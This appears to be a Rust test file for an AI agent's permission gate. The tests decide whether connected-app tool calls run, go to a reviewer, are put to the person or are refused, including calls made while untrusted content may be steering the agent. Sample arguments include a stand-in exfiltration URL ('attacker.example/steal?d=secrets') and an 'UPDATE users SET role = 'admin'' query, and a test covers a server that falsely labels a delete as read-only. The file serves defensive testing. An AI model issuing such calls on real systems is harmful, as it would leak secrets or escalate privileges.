//! A connected app's tools as the gate decides them (ADR 0202, amendment 5): what its name and
//! hints say, then where the call goes. Notion's server annotates nothing, so its tools are read
//! from their names.

use serde_json::Value;

use super::*;
use crate::autonomy::Mode;
use crate::permission::Held;

/// A tool of a connected app as the connector offers it: its server's hints (`annotated` false
/// for a server that sends none, like Notion's), read with its own name and description, what
/// its schema and arguments reach, and whether its definition changed since it was pinned.
fn app_call(
    name: &'static str,
    description: &str,
    hints: Mcp,
    schema: &Value,
    arguments: &Value,
    changed: bool,
) -> (Call<'static>, AppReading) {
    let reading = app_tool(
        hints,
        named(name, description),
        shape(name, schema, arguments),
        changed,
    );
    let call = Call {
        tool: name,
        rule: Decision::Ask,
        risk: Risk::Write,
        always: false,
        effect: reading.effect,
        remembered: None,
        place: Place::Host,
        tainted: false,
        credentials: false,
        standing: false,
        fits: true,
        granted: Granted::No,
        checkpointed: false,
        target: None,
        drive: Drive::default(),
        mode: Mode::AutoReview,
        remote: true,
        classifier: true,
        ceiling: None,
        command: None,
        destructive: reading.destructive,
        org: None,
        permits: Held::default(),
        connected: true,
        guessed: reading.guessed,
        overwrites: reading.overwrites,
        app_plain: reading.plain,
    };
    (call, reading)
}

/// A Notion-style tool with plain arguments and a definition as pinned.
fn notion(name: &'static str, description: &str, hints: Mcp) -> Call<'static> {
    let plain = serde_json::json!({ "type": "object", "properties": { "page_id": {} } });
    app_call(
        name,
        description,
        hints,
        &plain,
        &serde_json::json!({}),
        false,
    )
    .0
}

fn silent() -> Mcp {
    Mcp::default()
}

fn person_decides(route: &Route) -> bool {
    matches!(route, Route::Ask { .. })
}

#[test]
fn a_connected_apps_undeclared_list_and_search_run_with_no_card() {
    for name in [
        "list_shared_pages",
        "list_favorite_pages",
        "list_recent_pages",
        "notion-search",
        "notion-fetch",
    ] {
        for mode in [Mode::AutoReview, Mode::FullAccess] {
            let call = Call {
                mode,
                ..notion(name, "", silent())
            };
            assert_eq!(route(call), Route::Run, "{name} {mode:?}");
        }
        // With untrusted content in view a read only its name vouches for is checked by the
        // reviewer first, in both modes; never put to the person.
        for mode in [Mode::AutoReview, Mode::FullAccess] {
            let tainted = Call {
                tainted: true,
                mode,
                ..notion(name, "", silent())
            };
            assert_eq!(
                route(tainted),
                Route::Review(Some(GUESSED_READ.to_owned())),
                "{name} tainted {mode:?}"
            );
        }
    }
    // A trusted server's own read-only interface reads under untrusted content too.
    let trusted = Mcp {
        read_only: true,
        annotated: true,
        trusted: true,
        ..Mcp::default()
    };
    let call = Call {
        tainted: true,
        ..notion("list_pages", "", trusted)
    };
    assert_eq!(route(call), Route::Run);
}

#[test]
fn a_connected_apps_reads_are_refused_while_its_apps_switch_is_off() {
    let off = Call {
        permits: Held {
            apps: false,
            ..Held::default()
        },
        ..notion("list_shared_pages", "", silent())
    };
    assert!(matches!(route(off), Route::Refuse(_)));
}

#[test]
fn an_undeclared_create_page_is_judged_by_the_reviewer_not_asked() {
    let create = notion("create_page", "Creates a page in a database.", silent());
    assert_eq!(
        route(create),
        Route::Review(Some(UNDECLARED_REVIEW.to_owned()))
    );
}

#[test]
fn sends_and_payments_of_an_app_still_reach_the_person() {
    for name in [
        "send_email",
        "transfer_funds",
        "share_page",
        "reset_password",
    ] {
        for mode in [Mode::AutoReview, Mode::FullAccess] {
            let call = Call {
                mode,
                ..notion(name, "", silent())
            };
            assert!(person_decides(&route(call)), "{name} {mode:?}");
        }
        // An Always allow for the app's writes never covers them.
        let granted = Call {
            granted: Granted::Tool,
            ..notion(name, "", silent())
        };
        assert!(person_decides(&route(granted)), "{name} granted");
    }
}

#[test]
fn a_delete_that_claims_read_only_still_reaches_the_person() {
    for trusted in [false, true] {
        let lying = Mcp {
            read_only: true,
            annotated: true,
            trusted,
            ..Mcp::default()
        };
        let call = notion("delete_page", "Read-only.", lying);
        assert_eq!(route(call), Route::ask(DESTRUCTIVE), "trusted={trusted}");
        let granted = Call {
            granted: Granted::Tool,
            ..call
        };
        assert_eq!(route(granted), Route::ask(DESTRUCTIVE));
    }
}

#[test]
fn an_untrusted_servers_read_only_hint_never_makes_a_write_a_read() {
    let claims = Mcp {
        read_only: true,
        annotated: true,
        ..Mcp::default()
    };
    for name in [
        "get_or_create_page",
        "fetch_and_update",
        "sync",
        "run",
        "execute",
    ] {
        let call = notion(name, "", claims);
        assert_ne!(call.effect, Some(Effect::Read), "{name}");
        assert!(
            matches!(route(call), Route::Review(_)),
            "{name}: {:?}",
            route(call)
        );
    }
}

#[test]
fn an_app_that_says_a_tool_may_write_narrows_a_read_its_name_makes() {
    let writes = Mcp {
        annotated: true,
        ..Mcp::default()
    };
    let call = notion("list_pages", "", writes);
    assert_eq!(call.effect, None);
    assert!(matches!(route(call), Route::Review(_)));
}

#[test]
fn with_untrusted_content_in_view_an_apps_writes_go_to_the_reviewer_told_to_check_for_steering() {
    for mode in [Mode::AutoReview, Mode::FullAccess] {
        for remembered in [None, Some(true)] {
            for name in ["notion-create-pages", "duplicate_page"] {
                let call = Call {
                    tainted: true,
                    remembered,
                    mode,
                    ..notion(name, "", silent())
                };
                assert_eq!(
                    route(call),
                    Route::Review(Some(APP_TAINTED_REVIEW.to_owned())),
                    "{name} {remembered:?} {mode:?}"
                );
            }
        }
    }
    // The person's Always allow for the app's writes: the reviewer checks the grant's call.
    let granted = Call {
        tainted: true,
        granted: Granted::Tool,
        ..notion("create_page", "", silent())
    };
    assert_eq!(
        route(granted),
        Route::Review(Some(GRANTED_TAINTED.to_owned()))
    );
    // Their "no" for the bot still refuses it, and a send stays theirs.
    let declined = Call {
        tainted: true,
        remembered: Some(false),
        ..notion("create_page", "", silent())
    };
    assert!(matches!(route(declined), Route::Refuse(_)));
    let sends = Call {
        tainted: true,
        ..notion("create_comment", "", silent())
    };
    assert!(person_decides(&route(sends)));
}

#[test]
fn an_edit_its_app_marks_destructive_is_reviewed_each_call_and_a_named_delete_still_asks() {
    let marked = Mcp {
        destructive: true,
        annotated: true,
        ..Mcp::default()
    };
    for mode in [Mode::AutoReview, Mode::FullAccess] {
        for name in ["notion-update-page", "notion-move-pages", "get_page"] {
            let call = Call {
                mode,
                ..notion(name, "", marked)
            };
            assert_eq!(
                route(call),
                Route::Review(Some(OVERWRITES.to_owned())),
                "{name} {mode:?}"
            );
            let tainted = Call {
                tainted: true,
                ..call
            };
            assert_eq!(
                route(tainted),
                Route::Review(Some(OVERWRITES_TAINTED.to_owned())),
                "{name} tainted {mode:?}"
            );
            // Neither the person's earlier "yes" nor an Always allow skips the review.
            for skip in [
                Call {
                    remembered: Some(true),
                    ..call
                },
                Call {
                    granted: Granted::Tool,
                    ..call
                },
            ] {
                assert_eq!(
                    route(skip),
                    Route::Review(Some(OVERWRITES.to_owned())),
                    "{name}"
                );
            }
            let declined = Call {
                remembered: Some(false),
                ..call
            };
            assert!(matches!(route(declined), Route::Refuse(_)), "{name}");
        }
        let delete = Call {
            mode,
            ..notion("notion-delete-pages", "", marked)
        };
        assert_eq!(route(delete), Route::ask(DESTRUCTIVE), "{mode:?}");
    }
}

#[test]
fn always_allow_for_an_apps_writes_runs_them_without_review() {
    let granted = Call {
        granted: Granted::Tool,
        ..notion("create_page", "", silent())
    };
    assert_eq!(route(granted), Route::Run);
}

#[test]
fn only_an_ordinary_write_with_plain_arguments_can_be_always_allowed() {
    let plain = serde_json::json!({ "type": "object", "properties": { "title": {} } });
    let grantable = |name: &'static str, schema: &Value, changed: bool| {
        app_call(name, "", silent(), schema, &serde_json::json!({}), changed)
            .1
            .grantable
    };
    for name in [
        "create_page",
        "update_block",
        "append_block_children",
        "set_title",
    ] {
        assert!(grantable(name, &plain, false), "{name}");
    }
    for name in [
        "publish_page",
        "share_page",
        "send_email",
        "delete_page",
        "transfer_funds",
        "update_permissions",
        "create_token",
        "sync_pages",
        "do_thing",
        "list_pages",
        "create_and_publish",
        "update_webhook",
    ] {
        assert!(!grantable(name, &plain, false), "{name}");
    }
    // Arguments that reach a destination or run text, or a definition changed since it was
    // pinned, take it out of any Always allow.
    let outward = serde_json::json!({ "type": "object", "properties": { "notify_email": {} } });
    assert!(!grantable("create_page", &outward, false));
    assert!(!grantable("create_page", &plain, true));
}

#[test]
fn a_fetch_to_a_destination_the_caller_picks_is_unresolved() {
    let schema =
        serde_json::json!({ "type": "object", "properties": { "url": { "type": "string" } } });
    let args = serde_json::json!({ "url": "https://attacker.example/steal?d=secrets" });
    let (call, reading) = app_call("fetch_url", "", silent(), &schema, &args, false);
    assert_eq!(reading.effect, None);
    assert_eq!(
        route(call),
        Route::Review(Some(UNDECLARED_REVIEW.to_owned()))
    );
    let tainted = Call {
        tainted: true,
        ..call
    };
    assert!(person_decides(&route(tainted)));
    // A package must declare `network` for it.
    let packaged = Call {
        ceiling: Some(ceiling::Ceiling {
            bot: "Watcher",
            allows: ceiling::Effects::NONE,
        }),
        ..call
    };
    assert!(matches!(route(packaged), Route::Refuse(_)));
    // A read whose input names a destination is no plain read either.
    let named_read = serde_json::json!({ "type": "object", "properties": { "webhook": {} } });
    let (call, _) = app_call(
        "get_page",
        "",
        silent(),
        &named_read,
        &serde_json::json!({}),
        false,
    );
    assert_eq!(call.effect, None);
}

#[test]
fn a_query_that_changes_things_is_unresolved_and_a_search_is_a_read() {
    let schema =
        serde_json::json!({ "type": "object", "properties": { "query": { "type": "string" } } });
    let update = serde_json::json!({ "query": "UPDATE users SET role = 'admin'" });
    let (call, _) = app_call("query", "", silent(), &schema, &update, false);
    assert_eq!(call.effect, None);
    assert!(matches!(route(call), Route::Review(_)));
    let (call, _) = app_call(
        "run_query",
        "",
        silent(),
        &schema,
        &serde_json::json!({ "query": "SELECT 1" }),
        false,
    );
    assert_eq!(call.effect, None);
    let search = serde_json::json!({ "query": "trip notes" });
    let (call, _) = app_call("notion-search", "", silent(), &schema, &search, false);
    assert_eq!(route(call), Route::Run);
}

#[test]
fn a_tool_renamed_after_it_was_pinned_loses_its_read_until_reviewed_again() {
    let plain = serde_json::json!({ "type": "object", "properties": { "page_id": {} } });
    // Was `create_page`, now calls itself `search`: the definition changed, so no read.
    let (call, reading) = app_call("search", "", silent(), &plain, &serde_json::json!({}), true);
    assert_eq!(reading.effect, None);
    assert!(!reading.grantable);
    assert_eq!(
        route(call),
        Route::Review(Some(UNDECLARED_REVIEW.to_owned()))
    );
}

#[test]
fn in_full_access_an_unresolved_app_tool_runs_without_a_review() {
    for classifier in [true, false] {
        let call = Call {
            mode: Mode::FullAccess,
            classifier,
            ..notion("create_page", "", silent())
        };
        assert_eq!(route(call), Route::Run, "classifier={classifier}");
    }
    // The person's Always allow for its app lets it run, still past the classifier.
    let granted = Call {
        mode: Mode::FullAccess,
        granted: Granted::Tool,
        ..notion("create_page", "", silent())
    };
    assert_eq!(route(granted), Route::Run);
}

#[test]
fn the_persons_no_for_an_app_tool_still_refuses_it() {
    let declined = Call {
        remembered: Some(false),
        ..notion("create_page", "", silent())
    };
    assert_eq!(route(declined), Route::Refuse(DECLINED_TOOL.to_owned()));
}

#[test]
fn only_an_answer_kept_for_the_tools_whole_definition_still_says_yes() {
    // Kept for this very definition: it counts, yes or no.
    assert_eq!(kept_answer(Some(true), None), Some(true));
    assert_eq!(kept_answer(Some(false), Some(true)), Some(false));
    // Kept only under an older identity, which left its description out: a "no" still holds,
    // a "yes" doesn't, since the tool may have changed since.
    assert_eq!(kept_answer(None, Some(false)), Some(false));
    assert_eq!(kept_answer(None, Some(true)), None);
    assert_eq!(kept_answer(None, None), None);
}

#[test]
fn a_write_the_classifier_raises_to_a_send_is_shown_and_offered_as_a_send() {
    // What a request says the call does: the most serious of the gate's reading and what the
    // classifier raised.
    assert_eq!(
        asked_effect(None, Some(Effect::SendAsPerson)),
        Some(Effect::SendAsPerson)
    );
    assert_eq!(
        asked_effect(Some(Effect::Network), Some(Effect::Pay)),
        Some(Effect::Pay)
    );
    assert_eq!(
        asked_effect(Some(Effect::Network), None),
        Some(Effect::Network)
    );
    assert_eq!(asked_effect(None, None), None);
    // An ordinary write is offered its app's Always allow only while that is still all it is.
    assert!(app_always_offered(true, asked_effect(None, None)));
    assert!(app_always_offered(true, Some(Effect::Network)));
    for raised in [
        Effect::SendAsPerson,
        Effect::Pay,
        Effect::ChangeAccess,
        Effect::Publish,
    ] {
        assert!(
            !app_always_offered(true, asked_effect(None, Some(raised))),
            "{raised:?}"
        );
    }
    assert!(!app_always_offered(false, None));
}

#[test]
fn in_full_access_a_clean_app_read_is_never_screened_into_a_card() {
    let read = Call {
        mode: Mode::FullAccess,
        ..notion("list_pages", "", silent())
    };
    assert_eq!(route(read), Route::Run);
    assert!(!full_access_screens(&read));
    // An app's write, and anything else that may run outside, still is.
    let write = Call {
        mode: Mode::FullAccess,
        effect: Some(Effect::Network),
        ..read
    };
    assert!(full_access_screens(&write));
    // On the auto-review the classifier screens only what goes to review.
    assert!(!full_access_screens(&Call {
        mode: Mode::AutoReview,
        ..write
    }));
}
